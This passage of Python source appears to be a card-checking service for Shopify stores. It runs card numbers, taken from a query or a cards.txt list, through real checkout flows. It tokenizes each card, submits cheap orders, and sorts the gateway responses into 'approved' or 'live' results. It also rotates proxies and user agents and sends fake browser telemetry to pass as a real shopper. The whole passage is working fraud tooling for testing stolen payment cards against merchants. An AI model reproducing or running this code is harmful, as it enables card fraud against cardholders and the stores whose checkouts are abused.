                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": first, "lastName": last,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments":              {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id":               merch_id_full,
                                    "variantId":        variant_id_full,
                                    "properties":       [],
                                    "sellingPlanId":    None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity":             {"items": {"value": 1}},
                            "expectedTotalPrice":   {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents":       [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": state, "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":   {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":         None,
                        "proposedTotalAmount":         {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":          [],
                    },
                    "note":               {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint":  {
                        "signature":             None, "signatureUuid":         None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "memberships": {"memberships": []},
                    "cartMetafields": [],
                }

            # ── 3. Shipping proposal ─────────────────────────────────────
            ship_vars      = _base_vars()
            resp_json: Any = None

            for attempt in range(3):
                try:
                    r = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                              "operationName": "Proposal"},

                    )
                    resp_json = orjson.loads(r.content)
                except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                    if attempt < 2:
                        await asyncio.sleep(1)
                    continue

                data = resp_json.get("data", {}) or {}
                if data.get("session"):
                    break

                gql_errs = resp_json.get("errors", []) or []
                if gql_errs:
                    log.warning("shipping proposal GQL errors: %s",
                                [e.get("message", e) for e in gql_errs][:3])
                    interpreted, gql_detail = _parse_gql_errors(gql_errs)
                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                       "THROTTLED", "NO_PRODUCT"):
                        return _r(interpreted, detail=gql_detail)
                    if _is_schema_error(gql_errs):
                        return _r("GRAPHQL_ERROR", detail=gql_detail)
                    if attempt < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return _r(interpreted, detail=gql_detail)

            if not resp_json or not (resp_json.get("data") or {}).get("session"):
                return _r("GRAPHQL_ERROR", detail="no session data in response")

            # Refresh session token from shipping proposal response
            try:
                _ship_sst = r.headers.get("x-checkout-one-session-token")
                if _ship_sst:
                    sst = _ship_sst
                    gql_headers["x-checkout-one-session-token"] = sst
            except Exception:
                pass

            session_data = resp_json["data"]["session"]
            negotiate    = session_data.get("negotiate") or {}

            neg_errors = negotiate.get("errors") or []
            if neg_errors:
                code, neg_detail = _parse_gql_errors(neg_errors)
                if code != "GRAPHQL_ERROR":
                    return _r(code, detail=neg_detail)

            result_obj  = negotiate.get("result") or {}
            result_type = result_obj.get("__typename", "")

            if result_type == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")
            if result_type in ("Throttled", "TooManyRequests"):
                return _r("THROTTLED", approved="True")
            if result_type == "NegotiationResultFailed":
                return _r("NEGOTIATE_FAILED")

            checkpoint_data = result_obj.get("checkpointData")
            seller          = result_obj.get("sellerProposal") or {}

            if not seller:
                return _r("NO_SELLER_PROPOSAL")

            running_total_data = seller.get("runningTotal") or {}
            running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

            # Delivery info
            delivery_data     = seller.get("delivery") or {}
            delivery_strategy = ""
            shipping_amount   = 0.0
            if delivery_data.get("__typename") == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines") or []
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            amt_data = strategies[0].get("amount") or {}
                            shipping_amount = float(
                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            # Tax
            tax_data   = seller.get("tax") or {}
            tax_amount = 0.0
            if tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amt_data = tax_data.get("totalTaxAmount") or {}
                    tax_amount = float(
                        tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                    )
                except (ValueError, TypeError):
                    pass

            # Payment method - ONLY accept Shopify Payments (direct credit card)
            # This ensures we don't checkout with Stripe, PayPal, or other gateways
            payment_data       = seller.get("payment") or {}
            payment_identifier = None
            
            # List of allowed Shopify Payments identifiers
            SHOPIFY_PAYMENTS_IDENTIFIERS = [
                "shopify_payments",
                "shopify_installments", 
                "basic_card",
                "credit_card",
                "direct_credit_card",
            ]
            
            # Gateway names that indicate Shopify Payments (case-insensitive)
            SHOPIFY_PAYMENTS_NAMES = [
                "shopify payments",
                "credit card",
                "debit card", 
                "card payment",
                "basic card",
                "direct",
            ]
            
            # Gateways to EXPLICITLY reject (not Shopify Payments)
            REJECTED_GATEWAYS = [
                "stripe", "paypal", "afterpay", "klarna", "affirm", "sezzle",
                "zip", "quadpay", "clearpay", "laybuy", "splitit", "bread",
                "affirm", "apple pay", "google pay", "amazon pay", "venmo",
                "braintree", "authorize", "adyen", "worldpay", "checkout.com",
                "square", "2checkout", "bluesnap", "mollie", "razorpay",
            ]
            
            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pm_type = pm.get("__typename", "")
                    pid = pm.get("paymentMethodIdentifier") or ""
                    
                    if not pid:
                        continue
                        
                    detected_gateway = (pm.get("extensibilityDisplayName") or
                                        pm.get("name") or pm.get("brand") or
                                        pm.get("displayName") or "")
                    lower_gateway = detected_gateway.lower()
                    lower_pid = pid.lower()
                    
                    # REJECT if it's a non-Shopify gateway
                    is_rejected = any(rg in lower_gateway or rg in lower_pid for rg in REJECTED_GATEWAYS)
                    if is_rejected:
                        log.debug("Rejecting gateway: %s (pid=%s)", detected_gateway, pid)
                        continue
                    
                    # Accept if it's a direct credit card payment method (PaymentProvider or CustomerCreditCardPaymentMethod)
                    is_direct_cc = pm_type in ("PaymentProvider", "CustomerCreditCardPaymentMethod")
                    
                    if is_direct_cc:
                        payment_identifier = pid
                        gateway = detected_gateway if detected_gateway else "Direct CC Gateway"
                        price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                        # Hard guard: never submit a checkout whose total
                        # (product + shipping + tax) exceeds MAX_PRICE.
                        try:
                            if float(price) > MAX_PRICE:
                                return _r(
                                    f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}"
                                )
                        except (ValueError, TypeError):
                            pass
                        log.debug("Selected Direct CC gateway: %s (pid=%s)", gateway, pid)
                        break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

            # ── 4. Delivery proposal ─────────────────────────────────────
            # IMPORTANT: deep-copy the base vars so we don't share mutable state
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst

            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {
                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                },
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                "number": phone, "countryCode": country_code
            }
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                          "operationName": "Proposal"},

                )
                d_resp = orjson.loads(dr.content)
                log.debug("delivery proposal response keys: %s",
                          list(d_resp.keys()) if isinstance(d_resp, dict) else type(d_resp))
                if "errors" in d_resp and "data" not in d_resp:
                    log.warning("delivery proposal schema errors: %s",
                                [e.get("message") for e in d_resp.get("errors", [])][:3])
                # Refresh session token from delivery response
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst
                # Handle SubmittedForCompletion from delivery step (digital goods / auto-submit)
                d_result = (
                    d_resp.get("data", {}).get("session", {})
                    .get("negotiate", {}).get("result", {})
                )
                if d_result:
                    d_typename = d_result.get("__typename", "")
                    if d_typename == "SubmittedForCompletion":
                        # If payment was submitted/skipped before we even added our card, we can't test this product.
                        return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
                    # Update running_total from delivery seller proposal
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                        try:
                            price = f"{float(running_total):.2f}"
                        except (ValueError, TypeError):
                            pass
                        # Hard guard: never submit a checkout whose total
                        # exceeds MAX_PRICE (delivery step).
                        try:
                            if float(price) > MAX_PRICE:
                                return _r(
                                    f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}"
                                )
                        except (ValueError, TypeError):
                            pass
                    # Extract delivery strategy from delivery response
                    d_delivery = d_seller.get("delivery") or {}
                    if d_delivery.get("__typename") == "FilledDeliveryTerms":
                        d_d_lines = d_delivery.get("deliveryLines") or []
                        if d_d_lines:
                            d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                            d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                            if d_selected.get("handle"):
                                delivery_strategy = d_selected["handle"]
                            elif d_strategies:
                                delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                            # Update shipping amount from delivery response
                            if d_strategies:
                                d_ship_amt = d_strategies[0].get("amount") or {}
                                try:
                                    shipping_amount = float(
                                        d_ship_amt.get("value", {}).get("amount") or
                                        d_ship_amt.get("amount") or "0"
                                    )
                                except (ValueError, TypeError):
                                    pass
                    # Update tax from delivery response
                    d_tax = d_seller.get("tax") or {}
                    if d_tax.get("__typename") == "FilledTaxTerms":
                        d_tax_amt = d_tax.get("totalTaxAmount") or {}
                        try:
                            tax_amount = float(
                                d_tax_amt.get("value", {}).get("amount") or
                                d_tax_amt.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            pass
            except Exception as ex:
                log.debug("delivery proposal error: %s", ex)

            # ── 5. Tokenize card ─────────────────────────────────────────
            cc_clean = cc.strip().replace(" ", "").replace("-", "")
            cc_spaced = " ".join([cc_clean[i:i+4] for i in range(0, len(cc_clean), 4)])

            pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', page_text)
            pci_build_hash = pci_m.group(1) if pci_m else 'a8e4a94'

            token = None
            vault_configs = [
                ("https://checkout.pci.shopifyinc.com/sessions", cc_clean, hostname, "pci"),
                ("https://checkout.pci.shopifyinc.com/sessions", cc_clean, f"www.{hostname}" if not hostname.startswith("www.") else hostname, "pci"),
                ("https://deposit.shopifycs.com/sessions", cc_spaced, f"www.{hostname}" if not hostname.startswith("www.") else hostname, "site"),
                ("https://deposit.shopifycs.com/sessions", cc_clean, f"www.{hostname}" if not hostname.startswith("www.") else hostname, "site"),
                ("https://deposit.shopifycs.com/sessions", cc_spaced, hostname, "site"),
                ("https://deposit.shopifycs.com/sessions", cc_clean, hostname, "site"),
                ("https://deposit.shopifyinc.com/sessions", cc_clean, hostname, "pci"),
                ("https://deposit.shopifyinc.com/sessions", cc_spaced, hostname, "pci"),
            ]

            for vault_url, card_num, scope, origin_ref in vault_configs:
                try:
                    vault_payload = {
                        "credit_card": {
                            "number":             card_num,
                            "month":              int(month),
                            "year":               int(f"20{year}"),
                            "verification_value": cvv,
                            "name":               f"{first} {last}",
                            "start_month":        None,
                            "start_year":         None,
                            "issue_number":       "",
                        },
                        "payment_session_scope": scope,
                    }

                    v_headers = {
                        "Content-Type":       "application/json",
                        "Accept":             "application/json",
                        "Accept-Language":    "en-US,en;q=0.9",
                        "Origin":             "https://checkout.pci.shopifyinc.com",
                        "Referer":            f"https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL={checkout_url or ''}",
                        "User-Agent":         ua,
                        **client_hints,
                    }

                    if ident_sig:
                        v_headers["shopify-identification-signature"] = ident_sig

                    await _send_telemetry(
                        session=session,
                        metric_name="HostedFields_CardFields_vaultCard_called",
                        metric_type="counter",
                        value=1,
                        ua=ua,
                        client_hints=client_hints,
                        origin=ourl,
                    )

                    vr = await session.post(
                        vault_url, json=vault_payload,
                        headers=v_headers,
                        timeout=12,
                    )
                    log.debug("Vault tokenization attempt: url=%s scope=%s status=%d", vault_url, scope, vr.status_code)
                    if vr.status_code in (200, 201):
                        vd = orjson.loads(vr.content)
                        token = vd.get("id")
                        if token:
                            await _send_telemetry(
                                session=session,
                                metric_name="HostedFields_CardFields_form_submitted",
                                metric_type="counter",
                                value=1,
                                ua=ua,
                                client_hints=client_hints,
                            )
                            await _send_telemetry(
                                session=session,
                                metric_name="HostedFields_CardFields_deposit_time",
                                metric_type="histogram",
                                value=325,
                                ua=ua,
                                client_hints=client_hints,
                            )
                            log.debug("Vault tokenization success token: %s", token)
                            break
                except Exception as vex:
                    log.debug("Vault tokenization error for url=%s scope=%s: %s", vault_url, scope, vex)
                    continue

            if not token:
                return _r("TOKENIZATION_FAILED")

            # ── 6. Submit for completion ──────────────────────────────────
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }

            # Initialize signed_handles (empty by default, extracted from delivery response if available)
            signed_handles = []
            
            def _build_submit_body() -> dict:
                # Use the payment_identifier from the gateway detection step
                pid = payment_identifier if payment_identifier else token
                
                # Use resolved delivery strategy handle if available, otherwise match any
                if delivery_strategy:
                    sel_strategy = {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {"phone": phone}
                    }
                else:
                    sel_strategy = {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {"phone": phone}
                    }

                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {
                            "requestUrl": checkout_url,
                            "pageId": str(uuid.uuid4()).upper()
                        },
                        "input": {
                            "checkpointData": None,
                            "sessionInput": {"sessionToken": sst},
                            "queueToken": queue_token or "",
                            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines": [{
                                    "destination": {
                                        "streetAddress": {
                                            "address1": street,
                                            "address2": "",
                                            "city": city,
                                            "countryCode": country_code,
                                            "postalCode": s_zip,
                                            "company": "",
                                            "firstName": first,
                                            "lastName": last,
                                            "zoneCode": state,
                                            "phone": phone,
                                            "oneTimeUse": False
                                        }
                                    },
                                    "selectedDeliveryStrategy": sel_strategy,
                                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                                    "deliveryMethodTypes": ["SHIPPING"],
                                    "expectedTotalPrice": {
                                        "value": {"amount": str(shipping_amount), "currencyCode": currency}
                                    },
                                    "destinationChanged": False
                                }],
                                "noDeliveryRequired": [],
                                "useProgressiveRates": False,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": True
                            },
                            "deliveryExpectations": {
                                "deliveryExpectationLines": [{"signedHandle": sh} for sh in signed_handles]
                            },
                            "merchandise": {
                                "merchandiseLines": [{
                                    "stableId": stable_id,
                                    "merchandise": {
                                        "productVariantReference": {
                                            "id": merch_id_full,
                                            "variantId": variant_id_full,
                                            "properties": [],
                                            "sellingPlanId": None,
                                            "sellingPlanDigest": None
                                        }
                                    },
                                    "quantity": {"items": {"value": 1}},
                                    "expectedTotalPrice": {"any": True},
                                    "lineComponentsSource": None,
                                    "lineComponents": []
                                }]
                            },
                            "memberships": {"memberships": []},
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": pid,
                                            "sessionId": token,
                                            "billingAddress": billing_addr,
                                            "cardSource": None
                                        },
                                        "giftCardPaymentMethod": None,
                                        "redeemablePaymentMethod": None,
                                        "walletPaymentMethod": None,
                                        "walletsPlatformPaymentMethod": None,
                                        "localPaymentMethod": None,
                                        "paymentOnDeliveryMethod": None,
                                        "paymentOnDeliveryMethod2": None,
                                        "manualPaymentMethod": None,
                                        "customPaymentMethod": None,
                                        "offsitePaymentMethod": None,
                                        "customOnsitePaymentMethod": None,
                                        "deferredPaymentMethod": None,
                                        "customerCreditCardPaymentMethod": None,
                                        "paypalBillingAgreementPaymentMethod": None,
                                        "remotePaymentInstrument": None
                                    },
                                    "amount": {"any": True}
                                }],
                                "billingAddress": billing_addr,
                                "creditCardBin": cc_clean[:8]
                            },
                            "buyerIdentity": {
                                "customer": {
                                    "presentmentCurrency": currency,
                                    "countryCode": country_code
                                },
                                "email": email,
                                "emailChanged": False,
                                "phoneCountryCode": country_code,
                                "marketingConsent": [
                                    {"sms": {"consentState": "DECLINED", "value": phone, "countryCode": country_code}},
                                    {"email": {"consentState": "GRANTED", "value": email}}
                                ],
                                "shopPayOptInPhone": {
                                    "number": phone,
                                    "countryCode": country_code
                                },
                                "rememberMe": False,
                                "setShippingAddressAsDefault": False
                            },
                            "tip": {"tipLines": []},
                            "taxes": {
                                "proposedAllocations": None,
                                "proposedTotalAmount": {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions": []
                            },
                            "note": {
                                "message": None,
                                "customAttributes": []
                            },
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "scriptFingerprint": {
                                "signature": None,
                                "signatureUuid": None,
                                "lineItemScriptChanges": [],
                                "paymentScriptChanges": [],
                                "shippingScriptChanges": []
                            },
                            "optionalDuties": {"buyerRefusesDuties": False},
                            "captcha": None,
                            "cartMetafields": []
                        }
                    },
                    "operationName": "SubmitForCompletion"
                }

            s_resp: dict = {}
            s_data: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(
                        graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=_build_submit_body(),
                    )
                    s_resp = orjson.loads(sr.content)
                    # Refresh SST from submit response
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError) as ex:
                    log.debug("submit[%d] network: %s", submit_attempt, ex)
                    if submit_attempt < 2:
                        await asyncio.sleep(1.0)
                        continue
                    return _r("TIMEOUT")
                except Exception as ex:
                    log.debug("submit[%d] exception: %s", submit_attempt, ex)
                    if submit_attempt < 2:
                        await asyncio.sleep(1.0)
                        continue
                    return _r("SUBMIT_FAILED")

                log.debug("submit[%d] response typename: %s", submit_attempt,
                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    log.warning("submit no data, top-level errors: %s",
                                [e.get("message", e) for e in errs][:3])
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved)
                    submit_detail = "; ".join(
                        str(e.get("message", e)) for e in errs[:3]
                    ) if errs else "no submitForCompletion data"
                    return _r("GRAPHQL_ERROR", detail=submit_detail)

                stype = s_data.get("__typename", "")

                # ConfirmChangeViolation → retry to accept changes
                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                        await asyncio.sleep(0.5)
                        continue
                break

            stype = s_data.get("__typename", "")

            # ── Handle submit result types ────────────────────────────────
            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True")
                if rtype == "FailedReceipt":
                    pe      = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    log.debug("FailedReceipt processingError: %s", pe)
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT")
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED", approved="True")
                    # PaymentFailed: check both code and messageUntranslated
                    code = str(pe.get("code") or "").upper()
                    msg  = str(pe.get("messageUntranslated") or "").upper()
                    raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(norm, approved=approved)

                # ActionRequiredReceipt / ProcessingReceipt / WaitingReceipt → delegate to _poll_for_receipt_internal
                rid = receipt.get("id")
                if rid:
                    return await _poll_for_receipt_internal(
                        session=session,
                        receipt_id=rid,
                        sst=sst,
                        gql_headers=gql_headers,
                        graphql_url=graphql_url,
                        _r=_r,
                        checkout_url=checkout_url,
                        base_url=ourl,
                        ua=ua,
                        client_hints=client_hints,
                    )
                return _r("CARD_DECLINED")

            if stype == "SubmitFailed":
                return _r(_normalize_response(str(s_data.get("reason") or "")))

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                log.debug("SubmitRejected errors: %s", errs)
                if errs:
                    # Check ALL errors and ALL fields for the most specific code
                    best_code = "CARD_DECLINED"
                    for err_item in errs:
                        # Prefer nonLocalizedMessage (more specific) over localizedMessage
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                    "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                       "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(best_code, approved=approved)
                return _r("CARD_DECLINED")

            if stype == "Throttled":
                return _r("THROTTLED", approved="True")
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED")

            return _r("CARD_DECLINED")

        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT")
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            return {
                "Response": "ERROR",
                "CC":       f"{cc}|{month}|{year}|{cvv}",
                "Price":    price,
                "Gate":     gateway,
                "Site":     ourl,
                "Charged":  "False",
                "Approved": "False",
                "Time":     f"{round(time.time() - t0, 2)}s",
                "Detail":   f"{type(ex).__name__}: {str(ex)[:100]}",
            }
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


# ---------------------------------------------------------------------------
# Valid gateway response codes (site is live)
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "ORDER_PROCESSING", "ORDER_CREATION_FAILED",
    "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED", "CHARGED", "APPROVED",
})


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/shopify")
async def shopify_route(
    site:  str           = Query(..., description="Shopify store URL"),

    cc:    Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
):
    """Validate a card against a Shopify store checkout."""
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        card = random.choice(cards)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:  str           = Query(..., description="Shopify store URL to check"),
    card:  Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
):
    """
    Check if a Shopify store has products under ${MAX_PRICE} and whether
    its payment gateway returns a real (live) response.
    """
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"

    ua = random.choice(USER_AGENTS)
    client_hints = _client_hints_for_ua(ua)

    best, candidates, err = await _fetch_products(ourl, proxy, ua=ua, client_hints=client_hints)
    if not best:
        return JSONResponse({
            "valid":    False,
            "site":     site,
            "reason":   "NO_CHEAP_PRODUCTS",
            "detail":   err or "No products found under $8",
        })

    chosen     = random.choice(candidates) if candidates else best
    variant_id = chosen["variant_id"]

    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, variant_id=variant_id, proxy_str=proxy,
    )


    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       chosen["title"],
        "price":         chosen["price"],
        "card_response": response_code,
        "gate":          result.get("Gate", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/health")
async def health_route():
    cards  = _get_cards()
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(cards),
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
    })


@app.get("/stats")
async def stats_route():
    """Return request statistics."""
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    """Clear the product cache."""
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    """Reload cards from the cards file."""
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


# ---------------------------------------------------------------------------
# Middleware: per-request timing header + stats
# ---------------------------------------------------------------------------
@app.middleware("http")
async def add_timing(request: Request, call_next):
